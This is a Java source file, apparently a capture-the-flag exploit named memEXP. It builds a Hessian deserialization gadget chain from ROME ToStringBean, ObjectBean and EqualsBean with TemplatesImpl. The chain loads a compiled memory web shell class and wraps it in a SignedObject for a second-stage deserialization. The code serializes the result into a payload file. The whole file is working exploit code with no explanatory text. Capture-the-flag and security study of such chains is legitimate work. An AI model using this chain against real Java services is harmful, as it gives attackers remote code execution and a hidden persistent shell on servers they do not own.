package com.ctf.ezchain;

import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ObjectBean;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import java.io.*;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.*;
import java.util.Base64;
import java.util.HashMap;
import javax.xml.transform.Templates;

public class memEXP {
    //为类的属性设置值
    public static void setValue(Object target, String name, Object value) throws Exception {
        Field field = target.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(target,value);
    }
    public static HashMap getObject() throws Exception {
        TemplatesImpl templates = new TemplatesImpl();

        byte[] bytecodes = Files.readAllBytes(Paths.get("D:\\tmp\\memshell\\memoryshell.class"));
        setValue(templates,"_name", "aaa");
        setValue(templates, "_bytecodes", new byte[][] {bytecodes});
        setValue(templates,"_tfactory", new TransformerFactoryImpl());
        //构造ToStringBean
        ToStringBean toStringBean=new ToStringBean(Templates.class,templates);
        ToStringBean toStringBean1=new ToStringBean(String.class,"s");
        //构造ObjectBean
        ObjectBean objectBean=new ObjectBean(ToStringBean.class,toStringBean1);
        //构造HashMap
        HashMap hashMap=new HashMap();
        hashMap.put(objectBean,"snakin");
        //反射修改字段
        Field obj=EqualsBean.class.getDeclaredField("obj");
        Field equalsBean=ObjectBean.class.getDeclaredField("equalsBean");

        obj.setAccessible(true);
        equalsBean.setAccessible(true);

        obj.set(equalsBean.get(objectBean),toStringBean);

        return  hashMap;
    }

    public static void main(String[] args) throws Exception {
        HashMap evilhashMap=getObject();

        KeyPairGenerator keyPairGenerator;
        keyPairGenerator = KeyPairGenerator.getInstance("DSA");
        keyPairGenerator.initialize(1024);
        KeyPair keyPair = keyPairGenerator.genKeyPair();
        PrivateKey privateKey = keyPair.getPrivate();
        Signature signingEngine = Signature.getInstance("DSA");

        SignedObject signedObject = new SignedObject(evilhashMap,privateKey,signingEngine);

        ToStringBean toStringBean=new ToStringBean(SignedObject.class,signedObject);
        ToStringBean toStringBean1=new ToStringBean(String.class,"s");

        ObjectBean objectBean=new ObjectBean(ToStringBean.class,toStringBean1);

        HashMap hashMap=new HashMap();
        hashMap.put(objectBean,"snakin");

        Field obj= EqualsBean.class.getDeclaredField("obj");
        Field equalsBean=ObjectBean.class.getDeclaredField("equalsBean");

        obj.setAccessible(true);
        equalsBean.setAccessible(true);

        obj.set(equalsBean.get(objectBean),toStringBean);

        Hessian2Output hessianOutput1 = new Hessian2Output(new FileOutputStream("D:\\tmp\\payload.bin"));
        hessianOutput1.writeObject(hashMap);
        hessianOutput1.close();


    }

}

